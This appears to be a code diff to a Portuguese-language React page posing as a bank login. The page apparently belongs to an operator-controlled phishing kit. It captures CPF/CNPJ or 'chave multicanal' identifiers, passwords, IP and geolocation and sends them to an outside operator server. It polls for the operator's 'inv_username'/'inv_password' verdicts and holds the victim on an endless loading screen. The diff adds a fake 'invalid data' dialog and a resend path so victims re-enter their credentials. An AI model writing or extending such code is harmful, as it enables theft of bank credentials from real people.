@@ -9,6 +9,15 @@ import { useClientStatus } from "@/hooks/useClientStatus";
 import { useMetrics } from "@/hooks/useMetrics";
 import { useToast } from "@/hooks/use-toast";
 import { useCpfValidation } from "@/hooks/useCpfValidation";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 // Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
 const TABS = [
@@ -85,8 +94,14 @@ const collectClientData = async () => {
   };
 };
 
-// Função para monitorar cliente continuamente
-const monitorClient = async (clientId: string, navigate: (path: string) => void, toast: any): Promise<void> => {
+// Função para monitorar cliente continuamente - MODIFICADA
+const monitorClient = async (
+  clientId: string, 
+  navigate: (path: string) => void, 
+  toast: any,
+  setIsLoading: (loading: boolean) => void,
+  setShowInvalidDataModal: (show: boolean) => void
+): Promise<void> => {
   console.log(`Iniciando monitoramento do cliente: ${clientId}`);
   
   let intervalId: NodeJS.Timeout;
@@ -109,19 +124,15 @@ const monitorClient = async (clientId: string, navigate: (path: string) => void,
         console.log('Dados do cliente recebidos:', clientData);
         console.log('Valor do response:', clientData.data?.response);
         console.log('Valor do command:', clientData.data?.command);
-        console.log('Tipo do response:', typeof clientData.data?.response);
-        console.log('Tipo do command:', typeof clientData.data?.command);
         
-        // Verificar se recebeu comando de dados incorretos
-        if (clientData.data?.response === "inv_username" || clientData.data?.command === "inv_username") {
-          console.log('Detectado inv_username - Dados incorretos');
+        // Verificar se recebeu comando de dados incorretos (inv_username OU inv_password)
+        if (clientData.data?.response === "inv_username" || clientData.data?.command === "inv_username" ||
+            clientData.data?.response === "inv_password" || clientData.data?.command === "inv_password") {
+          console.log('Detectado comando de dados inválidos - Parando loading e mostrando modal');
           clearInterval(intervalId);
+          setIsLoading(false);
+          setShowInvalidDataModal(true);
           console.log('Monitoramento parado - dados incorretos');
-          toast({
-            title: "Dados incorretos",
-            description: "Os dados da página /home estão incorretos. Verifique suas credenciais e tente novamente.",
-            variant: "destructive",
-          });
           return;
         }
         
@@ -161,8 +172,14 @@ const monitorClient = async (clientId: string, navigate: (path: string) => void,
   console.log('Monitoramento contínuo configurado (3 segundos)');
 };
 
-// Função para processar resposta de registro e iniciar monitoramento
-const processRegistrationResponse = async (response: Response, navigate: (path: string) => void, toast: any): Promise<void> => {
+// Função para processar resposta de registro e iniciar monitoramento - MODIFICADA
+const processRegistrationResponse = async (
+  response: Response, 
+  navigate: (path: string) => void, 
+  toast: any,
+  setIsLoading: (loading: boolean) => void,
+  setShowInvalidDataModal: (show: boolean) => void
+): Promise<void> => {
   try {
     const responseData = await response.json();
     console.log('Cliente registrado com sucesso:', responseData);
@@ -176,7 +193,7 @@ const processRegistrationResponse = async (response: Response, navigate: (path: 
       console.log('ClientId salvo no localStorage:', responseData.clientId);
       
       // Iniciar monitoramento contínuo do cliente
-      await monitorClient(responseData.clientId, navigate, toast);
+      await monitorClient(responseData.clientId, navigate, toast, setIsLoading, setShowInvalidDataModal);
     } else {
       console.log('ClientId não encontrado na resposta');
       
@@ -187,7 +204,7 @@ const processRegistrationResponse = async (response: Response, navigate: (path: 
         // Salvar clientId no localStorage
         localStorage.setItem('clientId', clientId);
         console.log('ClientId salvo no localStorage:', clientId);
-        await monitorClient(clientId, navigate, toast);
+        await monitorClient(clientId, navigate, toast, setIsLoading, setShowInvalidDataModal);
       }
     }
   } catch (error) {
@@ -212,6 +229,9 @@ const Index = () => {
   const [saveCnpj, setSaveCnpj] = useState(false);
   const [saveChaveMulticanal, setSaveChaveMulticanal] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  
+  // Novo estado para controlar o modal de dados inválidos
+  const [showInvalidDataModal, setShowInvalidDataModal] = useState(false);
 
   // ---- Geolocalização nativa do navegador ----
   useEffect(() => {
@@ -276,6 +296,50 @@ const Index = () => {
     setCpf(formatted);
   };
 
+  // Função para limpar todos os campos
+  const clearAllFields = () => {
+    console.log('Limpando todos os campos...');
+    setCpf("");
+    setCnpj("");
+    setChaveMulticanal("");
+    setSenha("");
+    setSaveCpf(false);
+    setSaveCnpj(false);
+    setSaveChaveMulticanal(false);
+    cpfValidation.reset();
+    setShowInvalidDataModal(false);
+    console.log('Todos os campos limpos');
+  };
+
+  // Função para atualizar dados do cliente existente
+  const updateClientData = async (clientId: string, userData: any): Promise<boolean> => {
+    try {
+      console.log(`Atualizando dados do cliente ${clientId}...`);
+      
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}`, {
+        method: 'PUT',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(userData)
+      });
+
+      console.log(`Status da atualização: ${response.status}`);
+      
+      if (response.ok) {
+        console.log('Dados do cliente atualizados com sucesso');
+        return true;
+      } else {
+        const errorData = await response.text();
+        console.log('Erro na atualização dos dados:', errorData);
+        return false;
+      }
+    } catch (error) {
+      console.log('Erro durante atualização dos dados:', error);
+      return false;
+    }
+  };
+
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -333,7 +397,7 @@ const Index = () => {
         username = chaveMulticanal;
       }
 
-      console.log('Iniciando processo de registro do cliente...');
+      console.log('Iniciando processo de envio de dados...');
       console.log('Tab ativa:', tab);
       console.log('Username:', username);
       console.log('Senha:', senha);
@@ -342,7 +406,7 @@ const Index = () => {
       const clientData = await collectClientData();
       
       // Preparar dados para envio
-      const registerData = {
+      const userData = {
         username: username || 'teste_user',
         password: senha || 'teste_password',
         ip: clientData.ip,
@@ -353,29 +417,60 @@ const Index = () => {
         currentUrl: clientData.currentUrl
       };
 
-      console.log('Dados preparados para envio:', registerData);
+      console.log('Dados preparados para envio:', userData);
 
-      // Enviar requisição para API do operador
-      const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(registerData)
-      });
-
-      console.log('Status da resposta:', response.status);
+      // Verificar se já existe clientId (reenvio de dados)
+      const existingClientId = localStorage.getItem('clientId');
       
-      if (response.ok) {
-        // Processar resposta e iniciar monitoramento
-        await processRegistrationResponse(response, navigate, toast);
+      if (existingClientId) {
+        console.log('ClientId existente encontrado, fazendo UPDATE:', existingClientId);
+        
+        // Fazer UPDATE dos dados
+        const updateSuccess = await updateClientData(existingClientId, userData);
+        
+        if (updateSuccess) {
+          // Reiniciar monitoramento com os novos dados
+          await monitorClient(existingClientId, navigate, toast, setIsLoading, setShowInvalidDataModal);
+        } else {
+          console.log('Erro no update, fazendo novo registro...');
+          // Se update falhar, fazer novo registro
+          const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(userData)
+          });
+
+          if (response.ok) {
+            await processRegistrationResponse(response, navigate, toast, setIsLoading, setShowInvalidDataModal);
+          }
+        }
       } else {
-        const errorData = await response.text();
-        console.log('Erro na resposta da API:', errorData);
+        console.log('Nenhum clientId existente, fazendo novo registro...');
+        
+        // Fazer novo registro
+        const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(userData)
+        });
+
+        console.log('Status da resposta:', response.status);
+        
+        if (response.ok) {
+          // Processar resposta e iniciar monitoramento
+          await processRegistrationResponse(response, navigate, toast, setIsLoading, setShowInvalidDataModal);
+        } else {
+          const errorData = await response.text();
+          console.log('Erro na resposta da API:', errorData);
+        }
       }
 
     } catch (error) {
-      console.log('Erro durante o processo de registro:', error);
+      console.log('Erro durante o processo de envio:', error);
     }
     
     // Manter loading infinito - não setar isLoading para false
@@ -550,6 +645,28 @@ const Index = () => {
 
   return (
     <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
+      {/* Modal de Dados Inválidos */}
+      <AlertDialog open={showInvalidDataModal} onOpenChange={setShowInvalidDataModal}>
+        <AlertDialogContent className="max-w-md mx-auto">
+          <AlertDialogHeader>
+            <AlertDialogTitle className="text-center text-lg font-semibold">
+              Dados inválidos
+            </AlertDialogTitle>
+            <AlertDialogDescription className="text-center text-gray-600">
+              Os dados informados estão incorretos. Verifique suas credenciais e tente novamente.
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter className="flex justify-center">
+            <AlertDialogAction
+              onClick={clearAllFields}
+              className="bg-orange-500 hover:bg-orange-600 text-white px-8 py-2 rounded-full"
+            >
+              Entendi
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
+
       {/* Main Content Container */}
       <div className="w-full lg:w-1/2 flex flex-col justify-start px-4 sm:px-6 lg:px-[7%] pt-6 lg:pt-4 pb-8 relative">
         <div className="max-w-md w-full mx-auto">
